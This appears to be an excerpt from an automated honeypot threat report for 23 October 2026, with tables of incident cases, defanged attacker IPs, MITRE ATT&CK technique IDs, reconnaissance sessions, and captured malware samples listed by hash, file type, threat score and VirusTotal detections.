| IR-6d1eab6c54ed | HIGH | `103.154.77[.]48` | 2026-10-23 07:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-08718c3a401e | HIGH | `103.154.77[.]48` | 2026-10-23 07:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-68430cde4a34 | HIGH | `139.9.193[.]7` | 2026-10-23 07:44 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-e7d4372850d8 | HIGH | `223.104.38[.]3` | 2026-10-23 07:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-033b7baabad3 | HIGH | `223.104.38[.]3` | 2026-10-23 07:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a12f6b9e0828 | HIGH | `163.7.9[.]55` | 2026-10-23 07:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-742da7c30036 | HIGH | `163.7.9[.]55` | 2026-10-23 07:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-472bce58223a | HIGH | `117.187.180[.]251` | 2026-10-23 07:45 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-87088b1449c5 | HIGH | `134.112.56[.]47` | 2026-10-23 07:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7b8db194081f | HIGH | `134.112.56[.]47` | 2026-10-23 07:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-928a7e4b3147 | HIGH | `117.72.111[.]215` | 2026-10-23 07:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3627f089f7dc | HIGH | `109.160.32[.]132` | 2026-10-23 07:53 | Y | 1 | 0 | `T1078 · T1592` |
| IR-6bf4dfb98dc6 | HIGH | `109.160.32[.]132` | 2026-10-23 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-29b5f904a1ce | HIGH | `2.57.122[.]209` | 2026-10-23 08:00 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-af015f9419a7 | HIGH | `195.178.110[.]218` | 2026-10-23 08:10 | Y | 1 | 0 | `T1078 · T1592` |
| IR-3e5928995532 | HIGH | `117.72.111[.]215` | 2026-10-23 08:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5bc0349e9f92 | HIGH | `59.144.92[.]154` | 2026-10-23 08:17 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-627857ffbda9 | HIGH | `59.144.92[.]154` | 2026-10-23 08:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-90972eb1d34d | HIGH | `148.103.14[.]230` | 2026-10-23 08:18 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4f741d1d122c | HIGH | `117.72.111[.]215` | 2026-10-23 08:18 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-b2c56f4ddc6f | HIGH | `148.103.14[.]230` | 2026-10-23 08:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-209340a339b1 | HIGH | `179.179.195[.]143` | 2026-10-23 08:18 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6a5791100321 | HIGH | `179.179.195[.]143` | 2026-10-23 08:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fb6e53e264a0 | HIGH | `188.69.225[.]188` | 2026-10-23 08:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b8539aca58e3 | HIGH | `188.69.225[.]188` | 2026-10-23 08:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2edbd6b45f5d | HIGH | `138.68.103[.]218` | 2026-10-23 08:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 85 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.169[.]96` | **3** | 2026-10-23 00:55 | 2026-10-23 04:06 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **3** | 2026-10-23 06:07 | 2026-10-23 10:03 | 4m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **3** | 2026-10-23 09:12 | 2026-10-23 12:03 | 3m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]132` | **2** | 2026-10-23 07:52 | 2026-10-23 08:31 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.72.111[.]215` | **2** | 2026-10-23 07:55 | 2026-10-23 08:04 | 4m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-23 12:22 | 2026-10-23 14:22 | 3m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-10-23 00:57 | 2026-10-23 02:54 | 1m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-10-23 05:52 | 2026-10-23 06:05 | 1m | 0 | `T1592` | 🟢 LOW |
| `182.43.235[.]75` | **2** | 2026-10-23 03:55 | 2026-10-23 04:03 | 4m | 0 | `T1592` | 🟢 LOW |
| `208.109.39[.]19` | **2** | 2026-10-23 05:22 | 2026-10-23 06:01 | 1m | 0 | `T1592` | 🟢 LOW |
| `208.109.39[.]19` | **2** | 2026-10-23 08:11 | 2026-10-23 10:01 | 1m | 0 | `T1592` | 🟢 LOW |
| `59.28.177[.]179` | **2** | 2026-10-23 11:45 | 2026-10-23 12:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-10-23 03:17 | 2026-10-23 04:22 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.227.49[.]193` | 1 | 2026-10-23 11:28 | 2026-10-23 11:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `101.96.225[.]252` | 1 | 2026-10-23 02:06 | 2026-10-23 02:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.105.48[.]59` | 1 | 2026-10-23 13:17 | 2026-10-23 13:17 | 19s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]135` | 1 | 2026-10-23 06:01 | 2026-10-23 06:01 | 8s | 0 | `T1592` | 🟢 LOW |
| `113.31.115[.]157` | 1 | 2026-10-23 14:45 | 2026-10-23 14:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.219[.]201` | 1 | 2026-10-23 03:38 | 2026-10-23 03:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.48.147[.]99` | 1 | 2026-10-23 14:41 | 2026-10-23 14:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.53[.]159` | 1 | 2026-10-23 10:34 | 2026-10-23 10:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.139.211[.]160` | 1 | 2026-10-23 12:40 | 2026-10-23 12:40 | 16s | 0 | `T1592` | 🟢 LOW |
| `121.224.78[.]164` | 1 | 2026-10-23 11:02 | 2026-10-23 11:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.227.152[.]250` | 1 | 2026-10-23 03:45 | 2026-10-23 03:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.229.205[.]104` | 1 | 2026-10-23 06:57 | 2026-10-23 06:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.6.229[.]172` | 1 | 2026-10-23 03:50 | 2026-10-23 03:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.78.42[.]150` | 1 | 2026-10-23 07:51 | 2026-10-23 07:51 | 16s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-23 02:09 | 2026-10-23 02:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-23 06:50 | 2026-10-23 06:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-23 11:13 | 2026-10-23 11:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-23 13:33 | 2026-10-23 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.18[.]123` | 1 | 2026-10-23 04:04 | 2026-10-23 04:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.22.23[.]243` | 1 | 2026-10-23 08:20 | 2026-10-23 08:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.50.1[.]151` | 1 | 2026-10-23 01:23 | 2026-10-23 01:24 | 30s | 0 | `T1592` | 🟢 LOW |
| `142.93.23[.]63` | 1 | 2026-10-23 14:45 | 2026-10-23 14:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]144` | 1 | 2026-10-23 10:49 | 2026-10-23 10:49 | 4s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]176` | 1 | 2026-10-23 08:47 | 2026-10-23 08:47 | 3s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]177` | 1 | 2026-10-23 08:46 | 2026-10-23 08:47 | 4s | 0 | `T1592` | 🟢 LOW |
| `152.32.226[.]138` | 1 | 2026-10-23 11:41 | 2026-10-23 11:41 | 7s | 0 | `T1592` | 🟢 LOW |
| `16.5.0[.]208` | 1 | 2026-10-23 11:30 | 2026-10-23 11:30 | 3s | 0 | `T1592` | 🟢 LOW |
| `16.5.0[.]209` | 1 | 2026-10-23 11:30 | 2026-10-23 11:30 | 5s | 0 | `T1592` | 🟢 LOW |
| `163.125.145[.]5` | 1 | 2026-10-23 04:37 | 2026-10-23 04:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.154.231[.]129` | 1 | 2026-10-23 13:05 | 2026-10-23 13:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `167.172.187[.]145` | 1 | 2026-10-23 14:32 | 2026-10-23 14:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `167.71.34[.]179` | 1 | 2026-10-23 14:33 | 2026-10-23 14:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `169.212.149[.]252` | 1 | 2026-10-23 02:49 | 2026-10-23 02:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `170.231.236[.]98` | 1 | 2026-10-23 03:50 | 2026-10-23 03:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.10[.]55` | 1 | 2026-10-23 03:29 | 2026-10-23 03:30 | 32s | 0 | `T1592` | 🟢 LOW |
| `172.208.8[.]47` | 1 | 2026-10-23 09:44 | 2026-10-23 09:44 | 9s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]198` | 1 | 2026-10-23 13:09 | 2026-10-23 13:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `174.129.58[.]61` | 1 | 2026-10-23 01:29 | 2026-10-23 01:29 | 2s | 0 | `T1592` | 🟢 LOW |
| `176.65.132[.]132` | 1 | 2026-10-23 05:57 | 2026-10-23 05:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-10-23 07:40 | 2026-10-23 07:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.146[.]235` | 1 | 2026-10-23 14:39 | 2026-10-23 14:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.40.195[.]233` | 1 | 2026-10-23 13:14 | 2026-10-23 13:15 | 84s | 0 | `T1592` | 🟢 LOW |
| `186.19.123[.]99` | 1 | 2026-10-23 11:36 | 2026-10-23 11:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-23 09:55 | 2026-10-23 09:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-23 13:27 | 2026-10-23 13:29 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.187.110[.]159` | 1 | 2026-10-23 13:08 | 2026-10-23 13:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]218` | 1 | 2026-10-23 03:34 | 2026-10-23 03:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]218` | 1 | 2026-10-23 08:10 | 2026-10-23 08:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]218` | 1 | 2026-10-23 12:20 | 2026-10-23 12:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-10-23 07:16 | 2026-10-23 07:16 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-10-23 10:30 | 2026-10-23 10:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.29.43[.]119` | 1 | 2026-10-23 09:35 | 2026-10-23 09:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `201.79.4[.]116` | 1 | 2026-10-23 14:33 | 2026-10-23 14:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.89.28[.]114` | 1 | 2026-10-23 02:03 | 2026-10-23 02:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `207.154.201[.]108` | 1 | 2026-10-23 14:33 | 2026-10-23 14:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `207.175.192[.]136` | 1 | 2026-10-23 05:17 | 2026-10-23 05:17 | 12s | 0 | `T1592` | 🟢 LOW |
| `208.109.39[.]19` | 1 | 2026-10-23 12:13 | 2026-10-23 12:14 | 31s | 0 | `T1592` | 🟢 LOW |
| `218.158.227[.]211` | 1 | 2026-10-23 04:00 | 2026-10-23 04:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `218.78.63[.]123` | 1 | 2026-10-23 11:03 | 2026-10-23 11:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.78.80[.]37` | 1 | 2026-10-23 13:21 | 2026-10-23 13:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.120.83[.]75` | 1 | 2026-10-23 09:03 | 2026-10-23 09:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `220.243.133[.]81` | 1 | 2026-10-23 09:02 | 2026-10-23 09:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.103.201[.]40` | 1 | 2026-10-23 03:25 | 2026-10-23 03:25 | 23s | 0 | `T1592` | 🟢 LOW |
| `222.103.201[.]40` | 1 | 2026-10-23 08:45 | 2026-10-23 08:45 | 27s | 0 | `T1592` | 🟢 LOW |
| `222.109.132[.]225` | 1 | 2026-10-23 06:04 | 2026-10-23 06:04 | 19s | 0 | `T1592` | 🟢 LOW |
| `222.113.207[.]183` | 1 | 2026-10-23 12:55 | 2026-10-23 12:56 | 17s | 0 | `T1592` | 🟢 LOW |
| `223.83.183[.]254` | 1 | 2026-10-23 11:15 | 2026-10-23 11:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.156.189[.]9` | 1 | 2026-10-23 06:23 | 2026-10-23 06:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.22.208[.]37` | 1 | 2026-10-23 06:04 | 2026-10-23 06:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.62.51[.]106` | 1 | 2026-10-23 04:46 | 2026-10-23 04:46 | 12s | 0 | `T1592` | 🟢 LOW |
| `34.76.214[.]158` | 1 | 2026-10-23 06:23 | 2026-10-23 06:23 | 3s | 0 | `T1592` | 🟢 LOW |
| `36.137.180[.]219` | 1 | 2026-10-23 13:20 | 2026-10-23 13:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.137.249[.]148` | 1 | 2026-10-23 13:17 | 2026-10-23 13:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `40.80.204[.]121` | 1 | 2026-10-23 13:42 | 2026-10-23 13:42 | 9s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-23 01:08 | 2026-10-23 01:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-23 10:07 | 2026-10-23 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-10-23 07:10 | 2026-10-23 07:10 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]48` | 1 | 2026-10-23 07:28 | 2026-10-23 07:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.225.135[.]21` | 1 | 2026-10-23 07:34 | 2026-10-23 07:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-10-23 14:18 | 2026-10-23 14:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-10-23 02:47 | 2026-10-23 02:47 | 2s | 0 | `T1592` | 🟢 LOW |
| `46.101.205[.]87` | 1 | 2026-10-23 14:33 | 2026-10-23 14:34 | 20s | 0 | `T1592` | 🟢 LOW |
| `47.17.126[.]89` | 1 | 2026-10-23 13:09 | 2026-10-23 13:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.248.250[.]122` | 1 | 2026-10-23 14:38 | 2026-10-23 14:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.3.218[.]15` | 1 | 2026-10-23 14:32 | 2026-10-23 14:32 | 27s | 0 | `T1592` | 🟢 LOW |
| `59.36.211[.]132` | 1 | 2026-10-23 04:16 | 2026-10-23 04:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.96.11[.]251` | 1 | 2026-10-23 14:04 | 2026-10-23 14:05 | 5s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]192` | 1 | 2026-10-23 09:15 | 2026-10-23 09:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]66` | 1 | 2026-10-23 09:16 | 2026-10-23 09:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]3` | 1 | 2026-10-23 03:55 | 2026-10-23 03:55 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]62` | 1 | 2026-10-23 04:42 | 2026-10-23 04:42 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-10-23 05:20 | 2026-10-23 05:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]25` | 1 | 2026-10-23 02:16 | 2026-10-23 02:17 | 31s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]122` | 1 | 2026-10-23 02:28 | 2026-10-23 02:29 | 14s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-23 03:44 | 2026-10-23 03:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-23 14:12 | 2026-10-23 14:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-10-23 06:27 | 2026-10-23 06:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]73` | 1 | 2026-10-23 05:03 | 2026-10-23 05:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.38.187[.]176` | 1 | 2026-10-23 01:50 | 2026-10-23 01:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]53` | 1 | 2026-10-23 03:59 | 2026-10-23 03:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.39.155[.]177` | 1 | 2026-10-23 11:06 | 2026-10-23 11:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.43[.]221` | 1 | 2026-10-23 12:32 | 2026-10-23 12:32 | 1s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-10-23 14:25 | 2026-10-23 14:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | 1 | 2026-10-23 11:44 | 2026-10-23 11:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.49.109[.]8` | 1 | 2026-10-23 14:51 | 2026-10-23 14:51 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
